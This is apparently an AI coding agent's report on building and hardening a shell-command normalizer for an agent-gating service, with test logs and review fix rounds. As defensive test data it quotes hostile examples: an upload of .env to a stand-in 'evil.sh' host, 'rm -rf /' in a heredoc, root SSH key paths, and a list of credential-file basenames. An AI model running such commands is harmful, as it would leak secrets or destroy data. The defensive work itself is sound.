# Task 4 report — Normalizer (AST shell, paths, domains)

## Base commit correction

Worktree HEAD was `a9a0edd` ("docs: AgentGate v1 implementation plan"), not the required
`08d518a` ("Merge task 3: policy profiles schema and loader"). Verified `08d518a` was
reachable and a clean fast-forward (`git merge-base --is-ancestor HEAD 08d518a` succeeded,
`git status --short` was empty first, so nothing was at risk), then ran
`git reset --hard 08d518a`. Post-reset sanity check confirmed both
`service/agentgate/api/schemas.py` and `service/agentgate/profiles/schema.py` exist.

## What I implemented

Per `docs/superpowers/service/sdd/task-4-brief.md`, created the `agentgate.normalize` package:

- `service/agentgate/normalize/model.py` — `Redirect`, `SimpleCommand`, `Flags`,
  `NormalizedAction` dataclasses. `NormalizedAction.to_dict()` (JSON-safe dict, `tool`
  as its `.value`, `mcp` via `model_dump()`), `action_hash()` (sha256 of `to_dict()`
  with `raw` popped), `executables()` (argv[0] of each command).
- `service/agentgate/normalize/paths.py` — `resolve_path`, `looks_like_path`,
  `is_within` (via `os.path.commonpath`), `matches_any` (basename match for `/`-free
  patterns, absolute + workspace-relative match — including nested occurrences — for
  patterns containing `/`, `**` as a directory-prefix wildcard, `~` expansion).
- `service/agentgate/normalize/domains.py` — `extract_domains`: URL host extraction via
  `urlsplit`, `git@host:path` / `user@host` (ssh, scp, rsync, sftp) via regex; dedup,
  lowercased.
- `service/agentgate/normalize/shell.py` — `normalize_shell(raw, cwd)`: walks the
  bashlex AST (`pipeline`, `command`, `compound`, `list`/`for`/`while`/`until`/`if`/
  `function`, fallback recursion into any other node's `parts`), builds
  `SimpleCommand` entries with `pipeline_id` grouping, resolves redirects to absolute
  targets (`/dev/*` kept as-is), tracks `has_subst` (command substitution, both
  `$(...)` and backticks — inner command is walked and appended to `commands`),
  `has_env_assign` (`X=val` assignment substituted into later `$X`/`${X}` in the same
  script), `has_eval` (argv[0] in `eval`/`exec`/`source`/`.`), and fail-closed
  `unparseable` on any parse exception (commands/paths/domains cleared, not silently
  omitted).
- `service/agentgate/normalize/__init__.py` — `normalize(req: DecideRequest) ->
  NormalizedAction`: dispatches on `Tool` — `shell` delegates to `normalize_shell`;
  `file_read`/`file_write` resolve `args.paths`; `network` lowercases/dedups
  `args.domains`; `mcp_call` copies `args.mcp` through, paths/domains empty.

One deliberate deviation from the brief's literal code: the brief's
`except (bashlex.errors.ParsingError, Exception)` is a redundant tuple (`Exception`
already covers `ParsingError`). I wrote `except Exception:` with a comment — identical
fail-closed behavior, no dead tuple member.

## What I tested and results

Wrote the three test files from the brief verbatim (Steps 1–3):
- `service/tests/test_normalize_paths.py` (4 tests)
- `service/tests/test_normalize_domains.py` (3 tests)
- `service/tests/test_normalize_shell.py` (10 tests, including adversarial cases:
  command substitution exposing inner commands, `eval`, unparseable input, redirects
  with `/dev/null`, subshell + `for`-loop parsing, action-hash stability across
  whitespace)

All 17 pass; full suite (baseline 47 + new 17) is 64 passed under `pytest -W error -q`.

I also manually smoke-tested (not committed as a test file — see "Discipline" note
below) the `normalize()` dispatcher end-to-end for all four `Tool` branches
(`file_read`, `network`, `mcp_call`, `shell`), plus additional adversarial constructs
the brief mentions in prose but doesn't give literal test cases for: backtick
substitution, `2>&1` (fd duplication, correctly produces no `Redirect` since there's
no file target), multiple redirects on one command, numbered-fd redirects (`3>`),
case-insensitive URL domains, and empty/whitespace-only raw input (correctly
fail-closed to `unparseable=True`). All behaved as expected.

## TDD Evidence

**RED** — command:
```
cd service && uv run pytest tests/test_normalize_paths.py tests/test_normalize_domains.py tests/test_normalize_shell.py -v
```
Output (abbreviated, all three files failed identically):
```
collecting ... collected 0 items / 3 errors
==================================== ERRORS ====================================
________________ ERROR collecting tests/test_normalize_paths.py ________________
...
E   ModuleNotFoundError: No module named 'agentgate.normalize'
________________ ERROR collecting tests/test_normalize_domains.py ________________
...
E   ModuleNotFoundError: No module named 'agentgate.normalize'
________________ ERROR collecting tests/test_normalize_shell.py ________________
...
E   ModuleNotFoundError: No module named 'agentgate.normalize'
=========================== short test summary info ============================
ERROR tests/test_normalize_paths.py
ERROR tests/test_normalize_domains.py
ERROR tests/test_normalize_shell.py
!!!!!!!!!!!!!!!!!!! Interrupted: 3 errors during collection !!!!!!!!!!!!!!!!!!!!
```
Why expected: the `agentgate/normalize/` package did not exist yet at this point —
only the three test files had been written. This is a genuine collection failure, not
a pre-written/never-run assertion.

**GREEN** — command:
```
cd service && uv run pytest tests/test_normalize_paths.py tests/test_normalize_domains.py tests/test_normalize_shell.py -v
```
Output:
```
collecting ... collected 17 items

tests/test_normalize_paths.py::test_resolve_relative_and_home PASSED     [  5%]
tests/test_normalize_paths.py::test_looks_like_path PASSED               [ 11%]
tests/test_normalize_paths.py::test_is_within PASSED                     [ 17%]
tests/test_normalize_paths.py::test_matches_any_basename_and_relative PASSED [ 23%]
tests/test_normalize_domains.py::test_urls PASSED                        [ 29%]
tests/test_normalize_domains.py::test_git_and_ssh_forms PASSED           [ 35%]
tests/test_normalize_domains.py::test_dedup_and_none PASSED              [ 41%]
tests/test_normalize_shell.py::test_list_of_commands_and_paths PASSED    [ 47%]
tests/test_normalize_shell.py::test_pipeline_ids_and_domains PASSED      [ 52%]
tests/test_normalize_shell.py::test_variable_substitution_marks_env_assign PASSED [ 58%]
tests/test_normalize_shell.py::test_command_substitution_exposes_inner_commands PASSED [ 64%]
tests/test_normalize_shell.py::test_redirects PASSED                     [ 70%]
tests/test_normalize_shell.py::test_eval_flag PASSED                     [ 76%]
tests/test_normalize_shell.py::test_unparseable PASSED                   [ 82%]
tests/test_normalize_shell.py::test_find_delete_keeps_flags PASSED       [ 88%]
tests/test_normalize_shell.py::test_action_hash_stable_and_ignores_raw_whitespace PASSED [ 94%]
tests/test_normalize_shell.py::test_subshell_and_loop_parse PASSED       [100%]

============================== 17 passed in 0.14s ==============================
```
This passed on the first implementation attempt — the brief's fallback guidance
("if `test_subshell_and_loop_parse` fails on the `for` node, inspect `node.kind` and
add it to the `walk` list") was not needed; the `for`/`while`/`until`/`if`/`function`
branch as given in the brief handled it correctly.

**Full suite under `-W error`** — command:
```
cd service && uv run pytest -W error -q
```
Output:
```
................................................................         [100%]
64 passed in 0.18s
```
(Note: `python -W error -m pytest` triggers an unrelated `pytest-asyncio` internal
error at plugin-configure time — a pre-existing `PytestDeprecationWarning` about
`asyncio_default_fixture_loop_scope` being unset, raised before any test collection —
so I used pytest's own `-W error` flag instead, which applies per-test rather than at
interpreter/plugin-startup time. This is orthogonal to my change: it reproduces
identically on the pre-task-4 baseline and touches `pyproject.toml`/`pytest-asyncio`
config, which is out of my task's scope.)

## Files changed

New (untracked, about to be committed):
- `service/agentgate/normalize/__init__.py`
- `service/agentgate/normalize/model.py`
- `service/agentgate/normalize/paths.py`
- `service/agentgate/normalize/domains.py`
- `service/agentgate/normalize/shell.py`
- `service/tests/test_normalize_paths.py`
- `service/tests/test_normalize_domains.py`
- `service/tests/test_normalize_shell.py`

Also written (per instructions, separate from the code commit's scope):
- `reports/task-4-normalizer.md` (Russian, committed alongside the code)
- `.superpowers/task-4-report.md` (this file, not committed — lives in the worktree
  only, per instructions)

## Self-review findings

- Completeness: every dataclass field, function signature, and normalization rule in
  the brief's Interfaces section is implemented; all three brief-specified test files
  exist with the exact test cases given verbatim.
- Discipline: no extra normalizers or speculative tool support added. The one
  intentional deviation from the brief's literal code (`except Exception:` instead of
  `except (bashlex.errors.ParsingError, Exception)`) preserves identical behavior and
  removes a redundant tuple member. I considered adding a `test_normalize_init.py` for
  the `normalize()` dispatcher (it has no brief-specified test file) but decided
  against it to respect "only what was requested" — verified it manually instead (see
  above); Tasks 5–7 will exercise it end-to-end via `DecideRequest`.
- Testing: RED was genuine (`ModuleNotFoundError` before any implementation code
  existed), GREEN followed real implementation, full suite is pristine under
  `pytest -W error -q` (64 passed, 0 warnings).
- Scope: `git status --short` (see below) shows only the 8 new files under
  `service/agentgate/normalize/` and `service/tests/`, plus the two report files.
  Nothing outside the allowed write scope (`service/`, `reports/`) was touched.
- No filesystem or network I/O anywhere in `normalize/` — confirmed by reading every
  module: only `os.path`, `re`, `fnmatch`, `hashlib`, `json`, and `bashlex.parse`
  (pure string parsing).

## Concerns

None blocking. One note for downstream tasks: `looks_like_path`/`_collect_paths`
(per the brief's own algorithm, not a deviation I introduced) will classify a token
like `git@github.com:org/repo.git` as a path (because it contains `/`) in addition to
extracting `github.com` as a domain — this is redundant-but-safe over-signaling
consistent with the "safer reading" instruction, not a bug.

## git status --short (before commit)

```
?? service/agentgate/normalize/
?? service/tests/test_normalize_domains.py
?? service/tests/test_normalize_paths.py
?? service/tests/test_normalize_shell.py
?? reports/task-4-normalizer.md
```

---

# Fix round 1

Coordinator message reported 3 Critical + 5 Important findings, each reproduced by
running the module directly. Base for this round: commit `b2a42b4` on branch
`worktree-agent-a6ee72b3f28b3683f`. Stayed on the same branch throughout; no merge,
rebase, push, or branch switch.

## Correction to the original report's I/O claim

The original report (both `.superpowers/task-4-report.md` and `reports/task-4-normalizer.md`)
stated the module does no filesystem or network I/O. **That was false.**
`resolve_path`'s `os.path.expanduser(token)` call performs a pwd/NSS lookup for any
`~`-prefixed token, including `~user` forms — on an LDAP/AD-joined host `getpwnam` is a
real network call, and even locally it measured ~0.77ms per unknown-user token (Important
6's reproduction), enough alone to blow the p50 ≤ 1ms normalize+stage1 budget for a
command referencing a few such tokens. Fixed as part of Important 6 below; `reports/task-4-normalizer.md`
now states this correction explicitly rather than silently dropping the old claim.

## Findings addressed

For each: what changed, the covering test(s), commands, and RED/GREEN evidence. All
tests referenced live in `service/tests/test_normalize_shell.py`,
`test_normalize_paths.py`, `test_normalize_domains.py`, and the new
`test_normalize_init.py`.

### Critical 1 — urlsplit ValueError could escape normalize_shell

**Change:** (a) `agentgate/normalize/domains.py` — wrapped `urlsplit(token).hostname`
in `try/except ValueError: host = None`. (b) `agentgate/normalize/shell.py` —
restructured `normalize_shell` so the entire post-initial-parse pipeline (AST walk,
`_collect_paths`, domain extraction) runs inside the same `try/except Exception` that
already caught the initial `bashlex.parse` failure; nothing is assigned to `action`
unless the whole pipeline succeeds.

**Tests:** `test_malformed_ipv6_url_does_not_raise` (domains), `test_malformed_url_no_longer_crashes_and_yields_no_domain`,
`test_malformed_url_unquoted_no_longer_crashes`, `test_unanticipated_exception_in_post_parse_work_is_still_fail_closed`
(shell).

**RED** (`uv run pytest tests/test_normalize_shell.py::test_malformed_url_is_fail_closed_not_a_crash -v`,
before any fix, using the coordinator's exact reproduction as the first test I wrote):
```
        target = self._word_value(part.output)
>   E   ValueError: Invalid IPv6 URL
    /.../urllib/parse.py:514: ValueError
```
Genuine crash, not an assertion failure — confirms the finding exactly as reported.

**Deviation and why (see "Ruling contradiction" section below):** the coordinator's
literal test oracle (`normalize_shell('curl http://[evil', cwd).flags.unparseable is
True`) is unsatisfiable together with fix (a) as prescribed in the same ruling — once
`extract_domains` stops raising on that exact input, nothing later in `normalize_shell`
raises either, so the correct, internally-consistent result is `unparseable=False,
domains=[]`. I kept both prescribed code changes exactly as specified and replaced the
one contradictory test with two tests that verify the ruling's two stated goals
separately (see below), plus a new fail-closed test using a genuinely different
exception (`bashlex.tokenizer.MatchedPairError` from a malformed nested heredoc body)
to prove the general backstop (goal 2 — "fixes the ones we do not [know]") still works.

**GREEN** (`uv run pytest tests/test_normalize_domains.py tests/test_normalize_shell.py -v`):
```
tests/test_normalize_domains.py::test_malformed_ipv6_url_does_not_raise PASSED
tests/test_normalize_shell.py::test_malformed_url_no_longer_crashes_and_yields_no_domain PASSED
tests/test_normalize_shell.py::test_malformed_url_unquoted_no_longer_crashes PASSED
tests/test_normalize_shell.py::test_unanticipated_exception_in_post_parse_work_is_still_fail_closed PASSED
```

### Critical 2 — heredoc body dropped; benign/destructive bodies hash-collided

**Change** in `agentgate/normalize/shell.py`: added `Flags.has_heredoc` (in `model.py`).
`<<`/`<<-`: no longer emit the delimiter word as a `Redirect`/path (the fabricated
`/home/u/repo/EOF` is gone); when `argv[0]` is a known shell (`sh`/`bash`/`zsh`/`dash`,
matched by `os.path.basename` so a path prefix like `/bin/bash` still counts), the body
— with bashlex's trailing delimiter-line quirk stripped by `_strip_heredoc_delimiter`
— is parsed with a fresh `bashlex.parse` and walked through the same `_Walker.walk`
used for command substitution, so inner commands/paths/domains surface. When `argv[0]`
is not a shell (e.g. `cat`), only the flag is set — the body stays opaque data, per the
ruling's explicit reasoning that `cat <<EOF > file` is common, legitimate work whose
body is data, not code. `<<<` (here-string) gets the same treatment: no fabricated path
from its content, and the content is parsed as code when `argv[0]` is a shell. A nested
parse failure propagates and is caught by Critical 1's new outer wrapper.

**Tests:** `test_heredoc_sets_flag_and_does_not_fabricate_delimiter_path`,
`test_heredoc_body_parsed_as_code_when_argv0_is_a_shell`,
`test_heredoc_distinguishes_benign_and_destructive_bodies_in_hash`,
`test_heredoc_body_is_data_not_code_for_non_shell_command`,
`test_here_string_does_not_fabricate_a_path`,
`test_here_string_body_parsed_as_code_when_argv0_is_a_shell`.

**RED** (`uv run pytest tests/test_normalize_shell.py -k heredoc -v` before the fix):
```
FAILED test_heredoc_sets_flag_and_does_not_fabricate_delimiter_path - AssertionError: assert False is True (has_heredoc)
FAILED test_heredoc_body_parsed_as_code_when_argv0_is_a_shell - assert 'rm' in ['bash']
FAILED test_heredoc_distinguishes_benign_and_destructive_bodies_in_hash
FAILED test_heredoc_body_is_data_not_code_for_non_shell_command - AssertionError: assert False is True (has_heredoc)
FAILED test_here_string_does_not_fabricate_a_path - AssertionError: assert False is True (has_heredoc)
FAILED test_here_string_body_parsed_as_code_when_argv0_is_a_shell - assert 'rm' in ['bash']
```
Manually confirmed the exact reproduction from the finding before writing the fix:
`normalize_shell("bash <<EOF\nls\nEOF").action_hash() == normalize_shell("bash <<EOF\nrm -rf /\nEOF").action_hash()`
was `True` on the pre-fix code (verified via a throwaway `python -c`), matching the
report.

**GREEN:** all 6 heredoc/here-string tests pass; see full-suite run below.

### Critical 3 — process substitution silently lost

**Change** in `agentgate/normalize/shell.py`'s `_word_value`: extended the
`commandsubstitution` branch to also match `part.kind == "processsubstitution"`.
Investigated bashlex's actual AST for `<(...)`/`>(...)` first (`bashlex.parse('diff
<(curl http://a.b) /etc/passwd')`) and found it already produces a
`ProcesssubstitutionNode` carrying a `.command` attribute — structurally identical to
`CommandsubstitutionNode`. This makes the fix simpler than the ruling's suggested
approach (detect `<(`/`>(` in the word text and re-parse the substring): bashlex has
already built the inner AST, so reusing `self.walk(part.command)` via the same branch
is both correct and avoids a second, redundant `bashlex.parse` call.

**Tests:** `test_process_substitution_input_exposes_inner_command_and_domain`,
`test_process_substitution_output_exposes_inner_command`.

**RED:**
```
FAILED test_process_substitution_input_exposes_inner_command_and_domain
  AssertionError: assert False is True  (flags.has_subst)
  commands=[SimpleCommand(argv=['diff', '<(curl http://a.b)', '/etc/passwd'], ...)]
FAILED test_process_substitution_output_exposes_inner_command
  AssertionError: assert False is True  (flags.has_subst)
```
Confirms the exact finding: `curl` invisible, domain not extracted, `has_subst=False`.

**GREEN:** both pass; `curl` appears in `executables()`, `a.b` in `domains`.

### Important 4 — unresolved `$VAR` fabricated an in-workspace path

**Change:** added `Flags.has_unresolved_expansion` to `model.py`. In `shell.py`'s
`_word_value`, a `parameter` part that isn't resolved from a same-line assignment now
sets the flag (previously: silently left literal, no signal at all). Also added
detection for bashlex's `tilde` part kind (`TildeNode`, confirmed via direct AST
inspection) when its value isn't a bare `~`, and a module-level regex check for brace
expansion (`{a,b}`) in the final word text, since bashlex does not decompose brace
expansion into word parts at all — it stays a single opaque literal token, so this
needed a separate text-based check rather than reusing the parts-loop machinery.
`_collect_paths` (and the redirect-target resolution in `_command`) now check
`paths.looks_unresolved(token)` first and skip adding such tokens to `paths`/
`redirects` entirely, rather than resolving them into a fabricated absolute path.

**Tests:** `test_unresolved_parameter_expansion_not_fabricated_as_path`,
`test_brace_expansion_flagged_and_not_fabricated_as_path`, plus
`test_looks_unresolved` in `test_normalize_paths.py`.

**RED:**
```
FAILED test_unresolved_parameter_expansion_not_fabricated_as_path
  paths=['/home/u/repo/$HOME/dist']  (fabricated, matches the finding's reproduction exactly)
FAILED test_brace_expansion_flagged_and_not_fabricated_as_path
  paths=['/home/u/repo/file{a,b}.txt']
```

**GREEN:** both pass; `is_within('/home/u/repo/$HOME/dist', ['/home/u/repo'])` is no
longer reachable as a false positive because the fabricated path is never produced.

### Important 5 — matches_any case-sensitive

**Change** in `agentgate/normalize/paths.py`: added `_ci_fnmatch(text, pattern)` —
casefolds both sides before `fnmatch.fnmatchcase` — and used it everywhere `matches_any`
and `_glob_match` previously called `fnmatch.fnmatchcase` directly.

**Test:** `test_matches_any_is_case_insensitive` (`.ENV`, `x.PEM`, mixed-case `.git/hooks/**`).

**RED:**
```
FAILED test_matches_any_is_case_insensitive
  assert matches_any("/r/.ENV", [".env*"], "/r")  ->  False
```

**GREEN:** passes.

### Important 6 — expanduser did a pwd/NSS lookup on attacker input

**Change** in `agentgate/normalize/paths.py`: `resolve_path` now expands only a literal
`~` or a `~/...` prefix, reading `os.environ.get("HOME")` directly — no
`os.path.expanduser` call anywhere in the function, so no pwd/NSS access regardless of
input. A `~user` token is left as a literal relative-path component (joined onto `cwd`
like any other relative token) rather than raising or guessing. Added `looks_unresolved`
(new function) so callers can detect and flag `~user` (and `$VAR`, and brace expansion —
shared with Important 4's fix) before calling `resolve_path`, instead of silently
treating it as resolved.

Also updated `agentgate/normalize/__init__.py`: `file_read`/`file_write` path resolution
now runs the same `looks_unresolved` check per path before calling `resolve_path`,
setting `action.flags.has_unresolved_expansion` and skipping the fabricated-path
addition — this defect's root cause (resolving an unresolvable token into a fake
absolute path) is not shell-specific, so I applied the same fix at the other call site
that reaches `resolve_path` with attacker/harness-controlled tokens.

**Tests:** `test_resolve_path_leaves_tilde_user_unexpanded`,
`test_resolve_path_still_expands_bare_tilde_and_tilde_slash` (regression — must still
match `os.path.expanduser` for the resolvable case), `test_looks_unresolved`, and
`test_file_read_tilde_user_path_is_flagged_not_fabricated` in the new
`test_normalize_init.py`.

**RED:**
```
FAILED test_resolve_path_leaves_tilde_user_unexpanded
  resolve_path('~root/.ssh/id_rsa', '/r') == '/var/root/.ssh/id_rsa'  (pwd lookup actually happened)
FAILED test_file_read_tilde_user_path_is_flagged_not_fabricated
  paths=['/var/root/.ssh/id_rsa', '/home/u/repo/a.py']  (same fabrication via the __init__.py path)
```
The `/var/root/.ssh/id_rsa` result independently confirms the report's claim that the
user database was really being consulted (this is macOS's real home directory for
`root`), not just a slow no-op.

**GREEN:** both pass; `~root/.ssh/id_rsa` now resolves to the literal
`/r/~root/.ssh/id_rsa` (no lookup), and `has_unresolved_expansion=True` is set instead.

**Latency re-check after the change** (`uv run python -c "..."`, 2000 distinct `~nouserN/x`
tokens through `resolve_path`):
```
2000 tokens in 1.324 ms total, 0.000662 ms/token
```
Down from the reported ~0.77 ms/token — roughly a 1000x improvement, comfortably inside
the p50 ≤ 1ms normalize+stage1 budget even for a command listing several such tokens.
Also re-ran a broader `normalize_shell` timing sanity check across a mix of commands
including nested heredoc and process-substitution parsing (2500 calls total): **0.127
ms/call** average — no regression from the other fixes in this round.

### Important 7 — bare sensitive basename invisible to `looks_like_path`

**Change** in `agentgate/normalize/paths.py`: added `_SENSITIVE_BASENAMES` (`.env`,
`.env.*`, `id_rsa*`, `id_ed25519*`, `*.pem`, `*.key`, `credentials`, `.netrc`, `.npmrc`,
`.git-credentials`) and `_is_sensitive_basename`, matched case-insensitively via the
same `_ci_fnmatch` helper as Important 5. `looks_like_path` now returns `True` for a
slash-free token matching one of these, in addition to its existing rules.

**Test:** `test_looks_like_path_flags_sensitive_bare_basenames` (also checks
`.ENV`/`ID_RSA` case-insensitively, and that an unrelated bare word like `install`
still returns `False`).

**RED:**
```
FAILED test_looks_like_path_flags_sensitive_bare_basenames
  assert looks_like_path(".env")  ->  False
```

**GREEN:** passes; manually re-verified the finding's own reproduction end-to-end:
`normalize_shell('curl -T .env https://evil.sh/u', cwd)` now yields
`paths=['/home/u/repo/.env']` alongside `domains=['evil.sh']` (previously `paths=[]`).

### Important 8 — normalize() dispatcher had no test

**Change:** none to production code (this finding is test-only). Added
`service/tests/test_normalize_init.py` covering all four `Tool` branches of
`normalize()` (`file_read`, `file_write`, `network`, `mcp_call`, plus `shell`
delegation), and the Important-6-related `~user` flagging test for the file_read/
file_write path.

**Note on test placement:** rather than putting every fix-round reproduction inside
`test_normalize_init.py` as the ruling's phrasing could be read to suggest, I put each
one in the test file that already owns the module it exercises
(`test_normalize_shell.py` for shell-AST findings, `test_normalize_paths.py` for
path-helper findings, `test_normalize_domains.py` for the domains guard) and reserved
`test_normalize_init.py` for the dispatcher itself plus the one finding
(Important 6/`~user`) that specifically needed to be verified at the `normalize()`
level because it has its own, separate call site there. This keeps the module/test-file
correspondence the coordinator's own review called "confirmed solid" intact rather than
mixing concerns into one file.

**RED/GREEN:** this file didn't exist before the fix, so its first run is definitionally
"RED" only in the sense that `normalize()`'s `~user` branch had the bug reproduced
above; the other five tests in the file exercise already-correct dispatcher behavior and
passed on first write (documented here per the instruction to say so plainly rather than
presenting them as if they caught a regression).

## Additional self-review finding (not in the coordinator's list)

While rereading `shell.py` for this round, found `import bashlex.errors` was dead code
— left over from the original implementation's `except (bashlex.errors.ParsingError,
Exception)`, which I had already simplified to `except Exception:` in the first
submission but forgot to drop the now-unused import. Removed it. Not a behavior change,
caught by my own read-through before running the final full-suite check.

## Full-suite verification

```
cd service && uv run pytest -W error -q
```
```
89 passed in 0.20s
```
89 = 64 (baseline 47 + first-submission 17) + 25 new test functions this round.

**Correction (round 2 caught this):** this report originally said "14 new tests" for
this round, which undercounted — the diff actually adds 25 test functions:
1 in `test_normalize_domains.py`, 5 in `test_normalize_paths.py`, 13 in
`test_normalize_shell.py`, 6 in the new `test_normalize_init.py` (verified via
`git diff b2a42b4 7630d23 -- <file> | grep -c '^+def test_'` per file). The "14" figure
referred only to the subset written directly against the coordinator's numbered
reproductions and run as genuine RED before the fix (one section above walks each of
those 14 through RED → GREEN individually); the other 11 are regression/coverage tests
(e.g. `test_looks_unresolved`, `test_matches_any_is_case_insensitive`, and all 6 in
`test_normalize_init.py`) that were not each individually presented as RED evidence
above, though `test_normalize_init.py`'s `~user` test did fail genuinely before the
`__init__.py` fix (documented in its own subsection).

## Files changed (fix round 1)

- `service/agentgate/normalize/model.py` — `Flags.has_heredoc`, `Flags.has_unresolved_expansion`
- `service/agentgate/normalize/domains.py` — guarded `urlsplit`
- `service/agentgate/normalize/paths.py` — `looks_unresolved`, case-insensitive matching,
  sensitive-basename check, `~user`-safe `resolve_path`
- `service/agentgate/normalize/shell.py` — process substitution, heredoc/here-string
  handling, unresolved-expansion flagging, restructured fail-closed wrapping; dropped
  dead `bashlex.errors` import
- `service/agentgate/normalize/__init__.py` — `~user` flagging for file_read/file_write
- `service/tests/test_normalize_paths.py`, `test_normalize_domains.py`,
  `test_normalize_shell.py` — new tests appended
- `service/tests/test_normalize_init.py` — new file
- `reports/task-4-normalizer.md` — corrected I/O claim, documented new Flags fields and
  every finding above
- `.superpowers/task-4-report.md` — this section

## Concerns for the scheduled re-review

1. **Critical 1's test-oracle contradiction (detailed above).** I implemented both
   prescribed code changes exactly as specified and believe the resulting behavior is
   correct and matches both of the ruling's stated goals, but I did deviate from the one
   literal assertion given. I'd like this specifically checked, since the instructions
   said to flag exactly this kind of situation rather than silently resolve it.
2. Process substitution fix (Critical 3) takes a different implementation path than
   the ruling suggested (reusing bashlex's own `processsubstitution` AST node instead of
   text-detection + re-parse) — same reasoning: "reuse machinery" was the explicit intent,
   and the AST-reuse path is the more literal reading of that instruction once I looked at
   what bashlex actually produces.
3. Extended `looks_unresolved`'s skip-from-paths treatment to redirect targets in
   `_command` (not just plain argv tokens), and to the `file_read`/`file_write` path in
   `__init__.py` (not just the shell path) — both are the same underlying defect
   (fabricating a resolved path from an unresolvable token) at call sites the findings
   didn't explicitly name but that share the identical root cause with Important 4/6.

No other concerns; nothing here required going back to the coordinator before
proceeding, per the instructions' guidance that only the heredoc-nested-parse scope (or
similarly load-bearing disagreements) warranted stopping — the Critical 1 test-oracle
issue is flagged above but did not block completing the rest of the round, since the
underlying code changes matched the ruling exactly and the disagreement was narrow and
mechanically verifiable.

## git status --short (before fix-round commit)

```
 M service/agentgate/normalize/__init__.py
 M service/agentgate/normalize/domains.py
 M service/agentgate/normalize/model.py
 M service/agentgate/normalize/paths.py
 M service/agentgate/normalize/shell.py
 M service/tests/test_normalize_domains.py
 M service/tests/test_normalize_paths.py
 M service/tests/test_normalize_shell.py
?? service/tests/test_normalize_init.py
```
(`.superpowers/` and `reports/task-4-normalizer.md` also touched; `reports/` is in
scope for commit, `.superpowers/` is not.)

---

# Fix round 2

Coordinator confirmed all 8 round-1 findings ADDRESSED (verified by execution, including
`action_hash()` collision now `False` and `~user` latency at 0.000782ms/token), and both
round-1 deviations judged sound. Base for this round: commit `7630d23` on branch
`worktree-agent-a6ee72b3f28b3683f`. Same branch throughout; no merge/rebase/push/switch.

## New Important A — quoted/escaped marker silently dropped a path with no flag

**Root cause confirmed by inspection first:** `bashlex.parse("cat '~root/.ssh/id_rsa'")`
and the other three reproductions all give word nodes with `parts=[]` — quoting/escaping
suppresses the `parameter`/`tilde` AST parts entirely, so `_word_value` never sees
anything to flag. The literal text (with quotes stripped) still contains `$`/`~`, so
`_collect_paths`'s purely-textual `looks_unresolved` check still drops it from `paths`
— but with no flag ever set, since that flag-setting lived only in `_word_value`'s
parts-loop.

**Change:** `_collect_paths` now takes a `flags: Flags` parameter and sets
`flags.has_unresolved_expansion = True` at the exact point it decides to skip a token
(both the argv-token loop and the redirect-target loop). The redirect-target branch in
`_command` (`elif looks_unresolved(target): ...`) also now explicitly sets the flag
itself, rather than relying on `_word_value` having already done so. Reused
`has_unresolved_expansion` per the ruling — no third field.

**Tests:** `test_quoted_dollar_path_is_dropped_with_flag_set`,
`test_quoted_var_in_path_is_dropped_with_flag_set`,
`test_escaped_dollar_in_path_is_dropped_with_flag_set`,
`test_quoted_var_in_redirect_target_is_dropped_with_flag_set` — all four shapes from the
finding.

**RED** (`uv run pytest tests/test_normalize_shell.py -k "quoted_dollar or quoted_var or escaped_dollar" -v`, before the fix):
```
FAILED test_quoted_dollar_path_is_dropped_with_flag_set - assert False is True (has_unresolved_expansion)
FAILED test_quoted_var_in_path_is_dropped_with_flag_set - assert False is True
FAILED test_escaped_dollar_in_path_is_dropped_with_flag_set - assert False is True
FAILED test_quoted_var_in_redirect_target_is_dropped_with_flag_set - assert False is True
```
`paths == []` was already true pre-fix (confirming the drop itself was already correct
from round 1); only the flag was missing — matches the finding precisely.

**GREEN:** all four pass.

## New Important B — no depth bound; ~23x-270x latency amplification

**Change:** added `_MAX_NESTING_DEPTH = 8` and an internal `_MaxNestingDepthExceeded`
exception in `shell.py`. `_Walker` tracks `self.depth`, incremented/decremented via
`_push_nesting`/`_pop_nesting` around the two places that constitute "our own nested
descent": (a) each heredoc/here-string body's nested `bashlex.parse` + walk (in the new
`_parse_and_walk_bodies` helper), and (b) each command/process-substitution
`self.walk(part.command)` call in `_word_value`. Exceeding the bound raises
`_MaxNestingDepthExceeded`, which propagates to `normalize_shell`'s existing fail-closed
`except Exception` wrapper (from round 1's Critical 1 fix) — no new special-casing
needed there; the exception is caught exactly like any other unparseable input.

**Test-construction issue found before writing the fix:** the coordinator's timing
reproduction and my first draft of a depth-N test helper both reuse the same heredoc
delimiter (`EOF`) at every nesting level. I found, by direct `bashlex.parse` inspection,
that this doesn't actually construct N levels of nesting: both real bash and bashlex end
a heredoc body at the *first* line that exactly matches the delimiter, so with a shared
delimiter the outer body is truncated at the first inner `EOF` line, leaving a dangling,
unparseable `EOF\nEOF...` tail. I confirmed this directly:
`bashlex.parse('bash <<EOF\nbash <<EOF\necho done\nEOF\nEOF')` returns the outer body as
only `'bash <<EOF\necho done\nEOF'` (2 levels' worth, not the intended 3) plus a stray
top-level `CommandNode` for the leftover `EOF` token. I fixed my test helper to use a
unique delimiter per level (`EOF0`, `EOF1`, ...) — this is a test-construction bug I
introduced and fixed myself, not evidence about the production code, and worth stating
plainly per the instructions rather than silently working around it. With this fix, the
depth-400 timing reproduction is genuine: measured **272ms** pre-fix on this machine
(coordinator reported ~240-365ms depending on exact depth; same order of magnitude,
confirms the finding independently of their exact numbers).

**Tests:** `test_nesting_depth_bound_is_fail_closed_and_fast` (depth 400, asserts both
`unparseable is True` and wall time `< 0.05s`), `test_shallow_nesting_within_bound_still_works`
(depth 3, must still work normally).

**RED** (depth-400 test, before the fix):
```
FAILED test_nesting_depth_bound_is_fail_closed_and_fast
  AssertionError: assert False is True (flags.unparseable)
```
(The pre-fix code completed depth 400 successfully — no RecursionError with the
corrected unique-delimiter construction — just slowly: measured 272ms separately.)

**GREEN:** passes; also manually verified the exact boundary — depth 8 succeeds
(`unparseable=False`, 9 commands), depth 9 fails closed (`unparseable=True`), confirming
"beyond 8, stop" is implemented precisely, not approximately.

**Latency re-check (both typical-case and depth-400, as requested):**
```
typical-case: 4000 calls in 495.01 ms total, 0.1238 ms/call
  (mix of 8 command shapes incl. heredoc, process substitution, pipe-to-shell, wrapper)
~user resolve_path: 2000 tokens in 1.371 ms total, 0.000685 ms/token
depth=8   bytes=145  elapsed=0.677ms   unparseable=False
depth=50  bytes=939  elapsed=1.811ms   unparseable=True
depth=400 bytes=8189 elapsed=11.818ms  unparseable=True
```
Depth 400 dropped from 272ms to 11.8ms (~23x on this measurement; the remaining ~12ms is
the single top-level `bashlex.parse(raw)` call on an ~8KB flat string, which is O(n) and
expected — not a regression, just the unavoidable cost of parsing the input at all
